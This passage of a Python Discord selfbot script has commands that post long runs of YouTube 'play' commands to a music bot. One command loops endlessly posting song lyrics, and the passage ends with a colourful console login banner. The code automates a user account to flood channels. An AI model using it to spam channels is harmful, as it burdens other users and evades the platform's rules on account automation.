 print(f"{Fore.GREEN}succefully 7")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/343Q1V7vJS4")
 print(f"{Fore.GREEN}succefully 8")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/jRtZDlz-4k8")
 print(f"{Fore.GREEN}succefully 9")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/xAKsaP96pwg")
 print(f"{Fore.GREEN}succefully 10")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/VJYfcBIoIwQ")
 print(f"{Fore.GREEN}succefully 11")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/vS746tjcmDA")
 print(f"{Fore.GREEN}succefully 12")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/ypfEXvvJNFw")
 print(f"{Fore.GREEN}succefully 13")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/kupH89aD4_0")
 print(f"{Fore.GREEN}succefully 14")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/58u2f0bsioQ")
 print(f"{Fore.GREEN}succefully 15")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/BrxNOiQFKbc")
 print(f"{Fore.GREEN}succefully 16")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/Upaj82TrnZY")
 print(f"{Fore.GREEN}succefully 17")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://www.youtube.com/watch?v=d80YUkYRiVQ")
 print(f"{Fore.GREEN}succefully 18")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://www.youtube.com/watch?v=o1WXFxHXieM")
 print(f"{Fore.GREEN}succefully 19")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://www.youtube.com/watch?v=cckYtC6PhsM")
 print(f"{Fore.GREEN}succefully 20")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p {prefix} https://youtu.be/YHjU4n6gWOE")
 print(f"{Fore.GREEN}succefully 21")
 await asyncio.sleep(1)
 await ctx.send("m!repeatqueue")
 print(f"{Fore.GREEN}succefully 22")
 await asyncio.sleep(1)
 await ctx.send("https://cdn.discordapp.com/attachments/870583551849025546/917430594823139338/t.PNG")
 print(f"{Fore.GREEN}succefully 23")
 await asyncio.sleep(1)

@bot.command(pass_context=True)
async def autogame(ctx, prefix):
 await ctx.message.delete()
 await ctx.send("autoMusic Sender is now **enabled**!")
 await ctx.send(f"{prefix}p https://youtu.be/YFysDYq-FUQ")
 print(f"{Fore.GREEN}succefully one")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/VJYfcBIoIwQ")
 print(f"{Fore.GREEN}succefully Two")
 await ctx.send(f"{prefix}p https://youtu.be/mOivOlP9GRk")
 print(f"{Fore.GREEN}succefully Tree")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/Y-i_GwaaIh0")
 print(f"{Fore.GREEN}succefully 4")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/o53XaTNblQ4")
 print(f"{Fore.GREEN}succefully Five")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/kZKmmCIqN2Y")
 print(f"{Fore.GREEN}succefully 7")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/gsqQmv5u2k4")
 print(f"{Fore.GREEN}succefully 8")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/vS746tjcmDA")
 print(f"{Fore.GREEN}succefully 9")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/p_ORPS1wrLw")
 print(f"{Fore.GREEN}succefully 10")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/rs4JK01njwI")
 print(f"{Fore.GREEN}succefully 11")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/3Yp-oxOGdHA")
 print(f"{Fore.GREEN}succefully 12")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/J54MbhdwQYY")
 print(f"{Fore.GREEN}succefully 13")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/Jj_ojw52Y-c")
 print(f"{Fore.GREEN}succefully 14")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/3Ep767TgjeE")
 print(f"{Fore.GREEN}succefully 15")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/XjeVJSw2YP0")
 print(f"{Fore.GREEN}succefully 16")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/afFD-0TmIGg")
 print(f"{Fore.GREEN}succefully 17")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/dxj4WJv_LMM")
 print(f"{Fore.GREEN}succefully 18")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/E2R-QgBcTs8")
 print(f"{Fore.GREEN}succefully 19")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/wYM5cto-Uyw")
 print(f"{Fore.GREEN}succefully 20")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/NedfZs9iOSM")
 print(f"{Fore.GREEN}succefully 21")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/t6BbLSC8vzY")
 print(f"{Fore.GREEN}succefully 22")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/iD2rhdFRehU")
 print(f"{Fore.GREEN}succefully 23")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/c1G1YvhQz2s")
 print(f"{Fore.GREEN}succefully 24")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/JHsapbKQZ9k")
 print(f"{Fore.GREEN}succefully 25")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/QwdbFNGCkLw")
 print(f"{Fore.GREEN}succefully 26")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/JW3N-HvU0MA")
 print(f"{Fore.GREEN}succefully 27")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/tAM96N8bMk8")
 print(f"{Fore.GREEN}succefully 28")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/CYDP_8UTAus")
 print(f"{Fore.GREEN}succefully 29")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/6B-lxjyeors")
 print(f"{Fore.GREEN}succefully 30")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/YKqDiNJJPXk")
 print(f"{Fore.GREEN}succefully 31")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/WzHyamdBZ2Y")
 print(f"{Fore.GREEN}succefully 32")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/WzQBAc8i73E")
 print(f"{Fore.GREEN}succefully 33")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/gzql8KMTHIo")
 print(f"{Fore.GREEN}succefully 34")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/OFqeoXFSlms")
 print(f"{Fore.GREEN}succefully 35")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/_XspQUK22-U")
 print(f"{Fore.GREEN}succefully 36")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/vKU4MfuT_dc")
 print(f"{Fore.GREEN}succefully 37")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/Oy1Yh1u8w0k")
 print(f"{Fore.GREEN}succefully 38")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/D1dw_8zqT_I")
 print(f"{Fore.GREEN}succefully 39")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/fU2WAY9o-J8")
 print(f"{Fore.GREEN}succefully 40")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/ZhpPDkgn6aw")
 print(f"{Fore.GREEN}succefully 41")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/a1GiXGB0Lbs")
 print(f"{Fore.GREEN}succefully 41")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/p_UjTojmQVc")
 print(f"{Fore.GREEN}succefully 42")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/3wV3PhJFvg8")
 print(f"{Fore.GREEN}succefully 43")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/CqC2nPQeY6E")
 print(f"{Fore.GREEN}succefully 44")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/pfVODjDBFxU")
 print(f"{Fore.GREEN}succefully 45")
 await asyncio.sleep(1)
 await ctx.send("m!repeatqueue")
 print(f"{Fore.GREEN}succefully 46")
 await asyncio.sleep(1)
 await ctx.send("https://cdn.discordapp.com/attachments/870583551849025546/917430594823139338/t.PNG")
 print(f"{Fore.GREEN}succefully 47")
 await asyncio.sleep(1)

@bot.command(pass_context=True)
async def auto睡眠(ctx, prefix):
 await ctx.message.delete()
 await ctx.send("autoMusic Sender is now **enabled**!")
 await ctx.send(f"{prefix}p https://www.youtube.com/watch?v=0-BnrNpF9DQ")
 print(f"{Fore.GREEN}succefully one")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://www.youtube.com/watch?v=R7_fpfTa2ms")
 print(f"{Fore.GREEN}succefully one")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://www.youtube.com/watch?v=OMrpmPVUv5M")
 print(f"{Fore.GREEN}succefully Two")
 await asyncio.sleep(1)
 await ctx.send("m!repeatqueue")
 print(f"{Fore.GREEN}succefully 21")
 await asyncio.sleep(1)
 await ctx.send("https://cdn.discordapp.com/attachments/870583551849025546/917430594823139338/t.PNG")
 print(f"{Fore.GREEN}succefully 22")
 await asyncio.sleep(1)

@bot.command(pass_context=True)
async def autoall(ctx, prefix):
 await ctx.message.delete()
 await ctx.send("autoMusic Sender is now **enabled**!")
 await ctx.send(f"{prefix}p https://www.youtube.com/watch?v=0-BnrNpF9DQ")
 print(f"{Fore.GREEN}succefully one")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://www.youtube.com/watch?v=R7_fpfTa2ms")
 print(f"{Fore.GREEN}succefully one")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://www.youtube.com/watch?v=OMrpmPVUv5M")
 print(f"{Fore.GREEN}succefully Two")
 await asyncio.sleep(1)
 await ctx.send("m!repeatqueue")
 print(f"{Fore.GREEN}succefully 21")
 await asyncio.sleep(1)
 await ctx.send("https://cdn.discordapp.com/attachments/870583551849025546/917430594823139338/t.PNG")
 print(f"{Fore.GREEN}succefully 22")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/YFysDYq-FUQ")
 print(f"{Fore.GREEN}succefully one")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/VJYfcBIoIwQ")
 print(f"{Fore.GREEN}succefully Two")
 await ctx.send(f"{prefix}p https://youtu.be/mOivOlP9GRk")
 print(f"{Fore.GREEN}succefully Tree")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/Y-i_GwaaIh0")
 print(f"{Fore.GREEN}succefully 4")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/o53XaTNblQ4")
 print(f"{Fore.GREEN}succefully Five")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/kZKmmCIqN2Y")
 print(f"{Fore.GREEN}succefully 7")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/gsqQmv5u2k4")
 print(f"{Fore.GREEN}succefully 8")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/vS746tjcmDA")
 print(f"{Fore.GREEN}succefully 9")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/p_ORPS1wrLw")
 print(f"{Fore.GREEN}succefully 10")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/rs4JK01njwI")
 print(f"{Fore.GREEN}succefully 11")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/3Yp-oxOGdHA")
 print(f"{Fore.GREEN}succefully 12")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/J54MbhdwQYY")
 print(f"{Fore.GREEN}succefully 13")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/Jj_ojw52Y-c")
 print(f"{Fore.GREEN}succefully 14")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/3Ep767TgjeE")
 print(f"{Fore.GREEN}succefully 15")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/XjeVJSw2YP0")
 print(f"{Fore.GREEN}succefully 16")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/afFD-0TmIGg")
 print(f"{Fore.GREEN}succefully 17")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/dxj4WJv_LMM")
 print(f"{Fore.GREEN}succefully 18")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/E2R-QgBcTs8")
 print(f"{Fore.GREEN}succefully 19")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/wYM5cto-Uyw")
 print(f"{Fore.GREEN}succefully 20")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/NedfZs9iOSM")
 print(f"{Fore.GREEN}succefully 21")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/t6BbLSC8vzY")
 print(f"{Fore.GREEN}succefully 22")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/iD2rhdFRehU")
 print(f"{Fore.GREEN}succefully 23")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/c1G1YvhQz2s")
 print(f"{Fore.GREEN}succefully 24")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/JHsapbKQZ9k")
 print(f"{Fore.GREEN}succefully 25")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/QwdbFNGCkLw")
 print(f"{Fore.GREEN}succefully 26")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/JW3N-HvU0MA")
 print(f"{Fore.GREEN}succefully 27")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/tAM96N8bMk8")
 print(f"{Fore.GREEN}succefully 28")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/CYDP_8UTAus")
 print(f"{Fore.GREEN}succefully 29")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/6B-lxjyeors")
 print(f"{Fore.GREEN}succefully 30")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/YKqDiNJJPXk")
 print(f"{Fore.GREEN}succefully 31")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/WzHyamdBZ2Y")
 print(f"{Fore.GREEN}succefully 32")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/WzQBAc8i73E")
 print(f"{Fore.GREEN}succefully 33")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/gzql8KMTHIo")
 print(f"{Fore.GREEN}succefully 34")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/OFqeoXFSlms")
 print(f"{Fore.GREEN}succefully 35")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/_XspQUK22-U")
 print(f"{Fore.GREEN}succefully 36")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/vKU4MfuT_dc")
 print(f"{Fore.GREEN}succefully 37")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/Oy1Yh1u8w0k")
 print(f"{Fore.GREEN}succefully 38")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/D1dw_8zqT_I")
 print(f"{Fore.GREEN}succefully 39")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/fU2WAY9o-J8")
 print(f"{Fore.GREEN}succefully 40")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/ZhpPDkgn6aw")
 print(f"{Fore.GREEN}succefully 41")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/a1GiXGB0Lbs")
 print(f"{Fore.GREEN}succefully 41")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/p_UjTojmQVc")
 print(f"{Fore.GREEN}succefully 42")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/3wV3PhJFvg8")
 print(f"{Fore.GREEN}succefully 43")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/CqC2nPQeY6E")
 print(f"{Fore.GREEN}succefully 44")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/pfVODjDBFxU")
 print(f"{Fore.GREEN}succefully 45")
 await asyncio.sleep(1)
 await ctx.send("m!repeatqueue")
 print(f"{Fore.GREEN}succefully 46")
 await asyncio.sleep(1)
 await ctx.send("https://cdn.discordapp.com/attachments/870583551849025546/917430594823139338/t.PNG")
 print(f"{Fore.GREEN}succefully 47")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/7eXZZdaXRXc")
 print(f"{Fore.GREEN}succefully one")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/n7ZmBBf5-7g")
 print(f"{Fore.GREEN}succefully Two")
 await ctx.send(f"{prefix}p https://youtu.be/8pm_KoguqPM")
 print(f"{Fore.GREEN}succefully Tree")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/a1GiXGB0Lbs")
 print(f"{Fore.GREEN}succefully 4")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/z8IpY_XeusQ")
 print(f"{Fore.GREEN}succefully Five")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/JW3N-HvU0MA")
 print(f"{Fore.GREEN}succefully 7")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/343Q1V7vJS4")
 print(f"{Fore.GREEN}succefully 8")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/jRtZDlz-4k8")
 print(f"{Fore.GREEN}succefully 9")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/xAKsaP96pwg")
 print(f"{Fore.GREEN}succefully 10")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/VJYfcBIoIwQ")
 print(f"{Fore.GREEN}succefully 11")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/vS746tjcmDA")
 print(f"{Fore.GREEN}succefully 12")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/ypfEXvvJNFw")
 print(f"{Fore.GREEN}succefully 13")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/kupH89aD4_0")
 print(f"{Fore.GREEN}succefully 14")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/58u2f0bsioQ")
 print(f"{Fore.GREEN}succefully 15")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/BrxNOiQFKbc")
 print(f"{Fore.GREEN}succefully 16")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://youtu.be/Upaj82TrnZY")
 print(f"{Fore.GREEN}succefully 17")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://www.youtube.com/watch?v=d80YUkYRiVQ")
 print(f"{Fore.GREEN}succefully 18")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://www.youtube.com/watch?v=o1WXFxHXieM")
 print(f"{Fore.GREEN}succefully 19")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p https://www.youtube.com/watch?v=cckYtC6PhsM")
 print(f"{Fore.GREEN}succefully 20")
 await asyncio.sleep(1)
 await ctx.send(f"{prefix}p {prefix} https://youtu.be/YHjU4n6gWOE")
 print(f"{Fore.GREEN}succefully 21")
 await asyncio.sleep(1)
 await ctx.send("m!repeatqueue")
 print(f"{Fore.GREEN}succefully 22")
 await asyncio.sleep(1)
 await ctx.send("https://cdn.discordapp.com/attachments/870583551849025546/917430594823139338/t.PNG")
 print(f"{Fore.GREEN}succefully 23")
 await asyncio.sleep(1)

@bot.command(pass_context=True)
async def automsg2(ctx):
	await ctx.message.delete()
	await ctx.send("autoMassage Sender is now **enabled**!")
	global dmcs
	dmcs = True
	while dmcs:
		async with ctx.typing():
			await asyncio.sleep(1)
			await ctx.send("ディスオーダー　好き勝手やって蒔いた報いの種を踏んで")
			print(f"{Fore.GREEN}succefully one")
			await asyncio.sleep(3)
			await ctx.send("祈りの歌も届かないこの街じゃ暴力がお似合いだろうね")
			print(f"{Fore.GREEN}succefully Two")
			await ctx.send("交通法に従っていても目的地にはもう着かないぜ")
			print(f"{Fore.GREEN}succefully Tree")
			await asyncio.sleep(2)
			await ctx.send("名誉も金も未来も欲しいから絆の力で奪い取れ")
			print(f"{Fore.GREEN}succefully 4")
			await asyncio.sleep(2)
			await ctx.send("ロクデナシばっか　除け者にされてた")
			print(f"{Fore.GREEN}succefully Five")
			await asyncio.sleep(1)
			await ctx.send("ゴミ　カス　捨てられ　親に合わす顔も無い")
			print(f"{Fore.GREEN}succefully 7")
			await asyncio.sleep(1)
			await ctx.send("それでも生きてたい")
			print(f"{Fore.GREEN}succefully 8")
			await asyncio.sleep(1)
			await ctx.send("アイツを殴りたい")
			print(f"{Fore.GREEN}succefully 9")
			await asyncio.sleep(1)
			await ctx.send("そういう奴らの掃き溜めだ")
			print(f"{Fore.GREEN}succefully 10")
			await asyncio.sleep(1)
			await ctx.send("夜道に気を付けな")
			print(f"{Fore.GREEN}succefully 11")
			await asyncio.sleep(1)
			await ctx.send("売買で倍々ゲームなら大体は散々やった")
			print(f"{Fore.GREEN}succefully 12")
			await asyncio.sleep(1)
			await ctx.send("警察の権力も賢明で経営に加担していた")
			print(f"{Fore.GREEN}succefully 13")
			await asyncio.sleep(1)
			await ctx.send("適当な仕事をした奴から海に投げて消す次第だ")
			print(f"{Fore.GREEN}succefully 14")
			await asyncio.sleep(1)
			await ctx.send("仲間になったら世界を半分やるからこっちに付いて来な")
			print(f"{Fore.GREEN}succefully 15")
			await asyncio.sleep(1)
			await ctx.send("弱き者に仇を")
			print(f"{Fore.GREEN}succefully 16")
			await asyncio.sleep(1)
			await ctx.send("悪しき者に鉛を")
			print(f"{Fore.GREEN}succefully 17")
			await asyncio.sleep(1)
			await ctx.send("許されない事でも")
			print(f"{Fore.GREEN}succefully 18")
			await asyncio.sleep(1)
			await ctx.send("俺が許してやるよ")
			print(f"{Fore.GREEN}succefully 19")
			await asyncio.sleep(1)
			await ctx.send("全て手に入れるのは")
			print(f"{Fore.GREEN}succefully 20")
			await asyncio.sleep(1)
			await ctx.send("全て捨てた奴だけ")
			print(f"{Fore.GREEN}succefully 21")
			await asyncio.sleep(1)
			await ctx.send("結局弾丸一発で")
			print(f"{Fore.GREEN}succefully 22")
			await asyncio.sleep(1)
			await ctx.send("分からせてやるしかないだけ")
			print(f"{Fore.GREEN}succefully 23")
			await asyncio.sleep(1)
			await ctx.send("葉っぱ　売女　絵画　ファイア　撒いた　チャイナタウン ")
			print(f"{Fore.GREEN}succefully 24")
			await asyncio.sleep(1)
			await ctx.send("人為的なパンクタイヤ　隠し持ったナイフ")
			print(f"{Fore.GREEN}succefully 25")
			await asyncio.sleep(1)
			await ctx.send("なんだかんだ言ってないで黙れないのか")
			print(f"{Fore.GREEN}succefully 26")
			await asyncio.sleep(1)
			await ctx.send("完全合意で空になったサイフ")
			print(f"{Fore.GREEN}succefully 27")
			await asyncio.sleep(1)
			await ctx.send("テリトリーで揉み合い")
			print(f"{Fore.GREEN}succefully 28")
			await asyncio.sleep(1)
			await ctx.send("トミーガンのデリバリー")
			print(f"{Fore.GREEN}succefully 30")
			await asyncio.sleep(1)
			await ctx.send("葬儀業者の手配")
			print(f"{Fore.GREEN}succefully 31")
			await asyncio.sleep(1)
			await ctx.send("鳴り止まないジャズスウィング")
			print(f"{Fore.GREEN}succefully 32")
			await asyncio.sleep(1)
			await ctx.send("ウイスキーと摩天楼")
			print(f"{Fore.GREEN}succefully 33")
			await asyncio.sleep(1)
			await ctx.send("眠る君の横顔")
			print(f"{Fore.GREEN}succefully 34")
			await asyncio.sleep(1)
			await ctx.send("絶えず命爆ぜる音が響く今夜も")
			print(f"{Fore.GREEN}succefully 35")
			await asyncio.sleep(1)
			await ctx.send("消せど消えぬ傷跡")
			print(f"{Fore.GREEN}succefully 36")
			await asyncio.sleep(1)
			await ctx.send("寝ても覚めても戦場")
			print(f"{Fore.GREEN}succefully 37")
			await asyncio.sleep(1)
			await ctx.send("子供達に絆を")
			print(f"{Fore.GREEN}succefully 38")
			await asyncio.sleep(1)
			await ctx.send("裏切者に罰を")
			print(f"{Fore.GREEN}succefully 39")
			await asyncio.sleep(1)
			await ctx.send("気に入らないか？")
			print(f"{Fore.GREEN}succefully 40")
			await asyncio.sleep(1)
			await ctx.send("ならばお前がやりな")
			print(f"{Fore.GREEN}succefully 41")
			await asyncio.sleep(1)
			await ctx.send("せっかく拾った命なら")
			print(f"{Fore.GREEN}succefully 42")
			await asyncio.sleep(1)
			await ctx.send("大事にしてれば良いのにな")
			print(f"{Fore.GREEN}succefully 43")
			await asyncio.sleep(1)
			await ctx.send("https://cdn.discordapp.com/attachments/870583551849025546/917430594823139338/t.PNG")
			print(f"{Fore.GREEN}succefully 44")
			await asyncio.sleep(1)
			await ctx.send("https://cdn.discordapp.com/attachments/901456975576043600/924304038663704616/video0.mov")
			print(f"{Fore.GREEN}succefully 43")
			await asyncio.sleep(1)
			await ctx.send("https://cdn.discordapp.com/attachments/863450373817499650/929816264971534356/video0.mov")
			print(f"{Fore.GREEN}succefully 43")
			await asyncio.sleep(1)

@bot.command()
async def stopauto(ctx):
	await ctx.message.delete()
	await ctx.send("autoMassege Sender now **disabled**!")
	global dmcs
	global sent
	global turn
	dmcs = False
	sent = 1
	turn = 0

@bot.command()
async def listen(ctx, *, string: str):
  global music
  await ctx.message.delete()
#  await ctx.send("Please Check Console\n Please Enter a input.")
#  inp = input("Change to?\n-> ")
  await bot.change_presence(activity=discord.Activity(type=discord.ActivityType.listening, name=string))
  await ctx.send(f"Change to Activity Status, Listen of {string}")
# Thanks For Shiumano
  music = string

@bot.event
async def on_ready():
  clear()
  activity = discord.Game(name=music, type=4)
  await bot.change_presence(status=discord.Status.online, activity=activity)
  print(f"""
\x1b[38;2;155;83;219m ▄▄▄       █    ██ ▄▄▄█████▓ ▒█████    ██████  ▄▄▄       ███▄    █ ▓█████▄ ▓█████  ██▀███  
\x1b[38;2;242;104;231m▒████▄     ██  ▓██▒▓  ██▒ ▓▒▒██▒  ██▒▒██    ▒ ▒████▄     ██ ▀█   █ ▒██▀ ██▌▓█   ▀ ▓██ ▒ ██▒
\x1b[38;2;188;83;219m▒██  ▀█▄  ▓██  ▒██░▒ ▓██░ ▒░▒██░  ██▒░ ▓██▄   ▒██  ▀█▄  ▓██  ▀█ ██▒░██   █▌▒███   ▓██ ░▄█ ▒
\x1b[38;2;172;95;249m░██▄▄▄▄██ ▓▓█  ░██░░ ▓██▓ ░ ▒██   ██░  ▒   ██▒░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█▄   ▌▒▓█  ▄ ▒██▀▀█▄  
\x1b[38;2;188;83;219m ▓█   ▓██▒▒▒█████▓   ▒██▒ ░ ░ ████▓▒░▒██████▒▒ ▓█   ▓██▒▒██░   ▓██░░▒████▓ ░▒████▒░██▓ ▒██▒
\x1b[38;2;242;104;231m ▒▒   ▓▒█░░▒▓▒ ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ▒▒▓  ▒ ░░ ▒░ ░░ ▒▓ ░▒▓░
\x1b[38;2;219;83;140m  ▒   ▒▒ ░░░▒░ ░ ░     ░      ░ ▒ ▒░ ░ ░▒  ░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░ ░ ▒  ▒  ░ ░  ░  ░▒ ░ ▒░
\x1b[38;2;249;99;95m  ░   ▒    ░░░ ░ ░   ░      ░ ░ ░ ▒  ░  ░  ░    ░   ▒      ░   ░ ░  ░ ░  ░    ░     ░░   ░ 
\x1b[38;2;255;136;88m      ░  ░   ░                  ░ ░        ░        ░  ░         ░    ░       ░  ░   ░

Selfbot is Ready!!{Fore.WHITE}
""")
# AutoSenderがAutoSanderになってるのはもうそう言うものです。
  print(f"\x1b[38;2;255;81;158m<-------------------------------------------------------------------->\x1b[38;2;80;141;255m")
  print(f"\x1b[38;2;255;96;255mLogged in as{Fore.WHITE}")
  print(f"""\x1b[38;2;221;81;255mUser Name & Tag | {bot.user.name}#{bot.user.discriminator}{Fore.WHITE}""")
  print(f"""\x1b[38;2;204;77;254mUser ID | {bot.user.id}{Fore.WHITE}""")
  print(f"""\x1b[38;2;155;54;255mGuilds | {len(bot.guilds)}{Fore.WHITE}""")
